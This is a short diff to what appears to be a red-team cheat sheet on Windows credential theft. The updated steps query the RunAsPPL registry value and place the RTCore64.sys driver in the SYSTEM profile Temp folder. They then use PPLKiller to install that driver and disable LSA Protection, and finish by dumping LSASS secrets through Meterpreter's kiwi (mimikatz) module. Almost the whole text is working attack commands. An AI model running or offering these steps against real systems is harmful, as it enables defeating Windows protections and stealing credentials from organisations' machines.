@@ -5,10 +5,13 @@ CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v Run
 
 Make sure the session you are running with has SYSTEM privleges.
 We need to upload the driver to the path:
-- `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - `mkdir Temp`.
+- Place the driver RTCore64.sys at: `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - `mkdir Temp`.
 
-Then we will disable PPL: 
-- `.\PPLKiller.exe /disablePPL <LSASS PID>`
+Now, we will need to install the driver:
+- `.\PPLKiller /installDriver`
+
+Then we will disable LSA Protection: 
+- `.\PPLKiller.exe /disableLSAProtection`
 
 Now we can use meterpreter mimikatz module to dump the lsass process: 
 - `load kiwi` - `creds_all` - `lsa_dump_secrets`
